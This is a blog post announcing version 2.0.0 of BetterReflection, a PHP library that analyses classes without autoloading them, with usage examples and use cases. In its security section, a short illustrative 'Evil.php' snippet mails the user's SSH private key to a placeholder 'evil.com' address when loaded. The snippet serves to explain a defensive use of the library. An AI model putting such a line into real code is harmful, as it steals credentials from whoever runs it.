<!DOCTYPE html>
<html>
    <head>
        <title>BetterReflection version 2.0.0 released</title>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta name="description" content="BetterReflection is a library that aims at providing additional and improved Reflection API compared to PHP&#039;s ext-reflection">
        <link href="https://ocramius.github.io/components/bootstrap/css/bootstrap.min.css" rel="stylesheet" type="text/css" />
        <link href="https://ocramius.github.io/components/bootstrap/css/bootstrap-responsive.min.css" rel="stylesheet" type="text/css" />
        <link href="https://ocramius.github.io/font/stylesheet.css" rel="stylesheet" type="text/css" />
        <link href="https://ocramius.github.io/css/menu_bubble.css" rel="stylesheet" type="text/css" />
        <link rel="stylesheet" type="text/css" href="https://ocramius.github.io/css/normalize.css" />
        <link rel="stylesheet" type="text/css" href="https://ocramius.github.io/css/demo.css" />
        <link rel="stylesheet" type="text/css" href="https://ocramius.github.io/font/font-awesome-4.2.0/css/font-awesome.min.css" />
        <link href="https://ocramius.github.io/img/marco-pivetta-ocramius.gif" rel="shortcut icon"/>
        <link rel="stylesheet" href="https://ocramius.github.io/components/highlightjs/styles/github.css" />
        <link href="https://ocramius.github.io/css/style.css" rel="stylesheet" type="text/css" />
        <link rel="alternate" type="application/atom+xml" href="https://ocramius.github.io/atom.xml" title=" activity feed" />
    </head>
    <script src="https://ocramius.github.io/js/snap.svg-min.js"></script>
    <body>
        <div class="container">

            <div class='menu-wrap'>
                <nav class="menu">
                    <div class="icon-list">
                        <a href="https://ocramius.github.io/"><i class="fa fa-fw fa-newspaper-o"></i><span>Latest Posts</span></a>
                        <a href="https://ocramius.github.io/blog"><i class="fa fa-fw fa-comment-o"></i><span>Archive</span></a>
                        <a href="https://ocramius.github.io/talks"><i class="fa fa-fw fa-youtube"></i><span>Presentations</span></a>
                        <a href="https://ocramius.github.io/joindin"><i class="fa fa-fw fa-star-o"></i><span>Talks</span></a>
                        <a href="https://ocramius.github.io/about"><i class="fa fa-fw fa-user"></i><span>About</span></a>                        <a href="https://twitter.com/Ocramius" rel="me" title="Ocramius twitter profile" target="_blank"><i class="fa fa-fw fa-twitter"></i><span>Twitter</span></a>                        <a href="https://github.com/Ocramius" rel="me" title="Ocramius github profile" target="_blank"><i class="fa fa-fw fa-github"></i><span>Github</span></a>                    </div>
                </nav>                <button class="close-button" id="close-button">Close Menu</button>                <div class="morph-shape" id="morph-shape" data-morph-open="M-7.312,0H15c0,0,66,113.339,66,399.5C81,664.006,15,800,15,800H-7.312V0z;M-7.312,0H100c0,0,0,113.839,0,400c0,264.506,0,400,0,400H-7.312V0z">
                    <svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 100 800" preserveAspectRatio="none">
                        <path d="M-7.312,0H0c0,0,0,113.839,0,400c0,264.506,0,400,0,400h-7.312V0z"/>
                    </svg>
                </div>
            </div>            <button class="menu-button" id="open-button">Open Menu</button>
            <div class="content-wrap">
                <div class="content">
                    <div class="top left">
                        <p id="shield-container" class="logo-cont left" style="width: 200px; padding: 0; margin: 0; height: 200px;
"></p>                        <h2 class="left text-center">Marco Pivetta <span>(<a href="//twitter.com/Ocramius" target="blank">Ocramius</a>)</span></h2>                    </div>

                    <div class="clear"></div>
                    <p class="text-center remove-margin">
                        <img src="https://ocramius.github.io/img/separator.png" alt=""/>
                    </p>
                    <div class="row-fluid">
                        <div class="span12">    <article>
        <header>
            <h1>BetterReflection version 2.0.0 released</h1>
        </header>
        <div><p>
    <a href="https://twitter.com/RoaveTeam" target="_blank" rel="fn org">Roave</a>'s
    <a href="https://github.com/Roave/BetterReflection" target="_blank">BetterReflection</a>
    <a href="https://github.com/Roave/BetterReflection/releases/tag/2.0.0" target="_blank">2.0.0s</a>
    was released today!
</p>

<p>
    I and <a href="http://twitter.com/asgrim" target="_blank">James Titcumb</a> started working on this
    project back in 2015, and it is a pleasure to see it reaching maturity.
</p>

<p>
    The initial idea was simple: James would implement all my wicked ideas, while I
    would lay back and get drunk on Drambuie.
</p>

<p>
    <img
        src="../../img/posts/2017-09-18-roave-better-reflection-v2.0.0/drunken-coding.jpg"
        alt="Me, drunk in bed. Photo by @Asgrim, since I was too drunk to human"
    />
</p>

<p>
    Yes, that actually happened. Thank you, James, for all the hard work! üçª
</p>

<p>
    <small>(I did some work too, by the way!)</small>
</p>

<h3>What the heck is BetterReflection?</h3>

<p>
    Jokes apart, the project is quite ambitious, and it aims at reproducing the entirety of the PHP
    reflection API without having any actual autoloading being triggered.
</p>

<p>
    When put in use, it looks like this:
</p>

<pre><code class="php">&lt;?php

// src/MyClass.php

namespace MyProject;

class MyClass
{
    public function something() {}
}
</code></pre>

<pre><code class="php">&lt;?php

// example1.php

use MyProject\MyClass;
use Roave\BetterReflection\BetterReflection;
use Roave\BetterReflection\Reflection\ReflectionMethod;

require_once __DIR__ . '/vendor/autoload.php';

$myClass = (new BetterReflection())
    -&gt;classReflector()
    -&gt;reflect(MyClass::class);

$methodNames = \array_map(function (ReflectionMethod $method) : string {
    return $method-&gt;getName();
}, $myClass-&gt;getMethods());

\var_dump($methodNames);

// class was not loaded:
\var_dump(\sprintf('Class %s loaded: ', MyClass::class));
\var_dump(\class_exists(MyClass::class, false));
</code></pre>

<p>
    As you can see, the difference is just in how you bootstrap the reflection API.
</p>

<p>
    Also, we do provide a fully backwards-compatible reflection API that you can use
    if your code heavily relies on <code>ext-reflection</code>:
</p>

<pre><code class="php">&lt;?php

// example2.php

use MyProject\MyClass;
use Roave\BetterReflection\BetterReflection;
use Roave\BetterReflection\Reflection\Adapter\ReflectionClass;

require_once __DIR__ . '/vendor/autoload.php';

$myClass = (new BetterReflection())
    -&gt;classReflector()
    -&gt;reflect(MyClass::class);

$reflectionClass = new ReflectionClass($myClass);

// You can just use it wherever you had `ReflectionClass`!
\var_dump($reflectionClass instanceof \ReflectionClass);
\var_dump($reflectionClass-&gt;getName());
</code></pre>

<p>
    How does that work?
</p>

<p>
    The operational concept is quite simple, really:
</p>

<ol>
    <li>
        We scan your codebase for files matching the one containing your class.
        This is fully configurable, but by default we use some ugly autoloader
        hacks to find the file without wasting disk I/O.
    </li>
    <li>
        We feed your PHP file to <a href="https://github.com/nikic/PHP-Parser" target="_blank">PHP-Parser</a>
    </li>
    <li>
        We analyse the produced <abbr title="Abstract Syntax Tree">AST</abbr> and
        wrap it in a matching <code>Roave\BetterReflection\Reflection\*</code>
        class instance, ready for you to consume it.
    </li>
</ol>

<p>
    The hard part is tracking the miriad of details of the PHP language,
    which is very complex and cluttered with scope, visibility and inheritance
    rules: we take care of it for you.
</p>

<h3>Use case scenarios</h3>

<p>
    The main use-cases for BetterReflection are most likely around security, code
    analysis and <abbr title="Ahead of Time">AOT</abbr> compilation.
</p>

<p>
    One of the most immediate use-cases will likely be in
    <a href="https://github.com/phpstan/phpstan" target="_blank">PHPStan</a>, which
    will finally be able to inspect hideous mixed OOP/functional/procedural code
    if <a href="https://github.com/phpstan/phpstan/issues/67" target="_blank">
        the current WIP implementation
    </a> works as expected.
</p>

<p>
    Since you can now "work" with code before having loaded it, you can harden API
    around a lot of security-sensitive contexts. A serializer may decide
    to not load a class if side-effects are contained in the file declaring it:
</p>

<pre><code class="php">&lt;?php

// Evil.php
\mail(
    'haxxor@evil.com',
    'All ur SSH keys are belong to us',
    \file_get_contents('~/.ssh/id_rsa')
);

// you really don't want to autoload this bad one:
class Evil {}
</code></pre>

<p>
    The same goes for classes implementing malicious <code>__destruct</code> code,
    as well as classes that may trigger autoloading of other malicious code.
</p>

<p>
    It is also possible to analyse code that is downloaded from the internet without
    actually running it. For instance, code may be checked against GPG signatures in
    the file signature before being run, effectively allowing PHP to "run only signed code".
    <a href="https://getcomposer.org/" target="_blank">Composer</a>, anybody?
</p>

<p>
    If you are more into code analysis, you may decide to compare two different
    versions of a library, and scan for <abbr title="Backwards Compatibility">BC</abbr>
    breaks:
</p>

<pre><code class="php">&lt;?php
// the-library/v1/src/SomeApi.php

class SomeAPI
{
    public function sillyThings() { /* ... */ }
}
</code></pre>

<pre><code class="php">&lt;?php
// the-library/v2/src/SomeApi.php

class SomeAPI
{
    public function sillyThings(UhOh $bcBreak) { /* ... */ }
}
</code></pre>

<p>
    In this scenario, somebody added a mandatory parameter to <code>SomeAPI#sillyThings()</code>,
    effectively introducing a BC break that is hard to detect without having both versions of the
    code available, or a good migration documentation (library developers: please document this
    kind of change!).
</p>

<p>
    Another way to leverage the power of this factory is to compile factory code into highly 
    optimised dependency injection containers, like
    <a href="https://github.com/PHP-DI/PHP-DI/pull/507" target="_blank">PHP-DI</a> started doing.
</p>

<h3>Future use cases?</h3>

<p>
    In addition to the above use-case scenarios, we are working on additional
    functionality that would allow
    <a href="https://github.com/Roave/BetterReflection/blob/2.0.0/demo/monkey-patching/index.php" target="_blank">
        changing code before loading it
    </a>. 
</p>

<p>
    Is that a good idea?
</p>

<p>
    ... I honestly don't know.
</p>

<p>
    Still, there are proper use-case scenarios around
    <abbr title="Aspect Oriented Programming">AOP</abbr> and proxying libraries,
    which would then be able to work even with <code>final</code> classes.
</p>

<p>
    You will likely see these features appear in a new, separate library.
</p>

<h3>Credits</h3>

<p>
    To conclude, I would like to thank <a href="https://github.com/asgrim" target="_blank">James Titcumb</a>, 
    <a href="https://github.com/kukulich" target="_blank">Jaroslav Hansl√≠k</a>,
    <a href="https://github.com/marcosh" target="_blank">Marco Perone</a> and
    <a href="https://github.com/POPSuL" target="_blank">Viktor Suprun</a> for the effort they put in this release,
    providing patches, improvements and overall helping us building something that may become
    extremely useful in the PHP ecosystem.
</p>
        </div>            <p class="tags">
            Tags:            <a href="https://ocramius.github.io/blog/tags/PHP">PHP</a>,            <a href="https://ocramius.github.io/blog/tags/Library">Library</a>,            <a href="https://ocramius.github.io/blog/tags/Roave">Roave</a>,            <a href="https://ocramius.github.io/blog/tags/Clean%20Code">Clean Code</a>,            <a href="https://ocramius.github.io/blog/tags/Tools">Tools</a>            </p>            <nav class="article">
                <ul>                        <li>Previous: <a class="previous" href="https://ocramius.github.io/blog/eliminating-visual-debt" title="Eliminating Visual Debt"><span class="title">Eliminating Visual Debt</span></a></li>                </ul>
            </nav>        </article>        <div data-tweet-id="909888939942711301" class="twitter-tweet"></div>        
        <div id="disqus_thread"></div>

        <script>
            if (typeof prettyPrint !== 'undefined') {
                $(prettyPrint);
            }
        </script>
        <script>
            var disqus_shortname = 'ocramius-dev';
            var disqus_identifier = '/blog/roave-better-reflection-v2.0';
            var disqus_url = 'https://ocramius.github.io/blog/roave-better-reflection-v2.0';
        </script>
        <script src="https://ocramius-dev.disqus.com/count.js"></script>
        <script src="https://ocramius-dev.disqus.com/embed.js"></script>                        </div>
                        <div class="span4 si debar"></div>
                   </div>
                </div>
            </div>

        </div>

        <script src="https://ocramius.github.io/js/shifty.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r66/three.min.js"></script>
        <script src="https://ocramius.github.io/components/bootstrap/js/bootstrap.min.js"></script>
        <script src="https://ocramius.github.io/components/jquery/jquery.min.js"></script>
        <script src ="https://ocramius.github.io/js/blogpost-tweets.js" type="text/javascript"></script>
        <script src="https://platform.twitter.com/widgets.js"></script>        <script type="text/javascript">
            (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
            })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

            ga('create', 'UA-33922165-1', 'auto');
            ga('send', 'pageview');
        </script>
        <script src="https://ocramius.github.io/components/highlightjs/highlight.pack.js"></script>
        <script>hljs.initHighlightingOnLoad();</script>
        <script src="https://ocramius.github.io/js/classie.js"></script>
        <script src="https://ocramius.github.io/js/main4.js"></script>
        <script src="https://ocramius.github.io/js/three-js-object-loader.js"></script>
        <script src="https://ocramius.github.io/js/mario.js"></script>
        <script>mario($('#shield-container'), "https://ocramius.github.io/logo/mario");</script>
    </body>
</html>
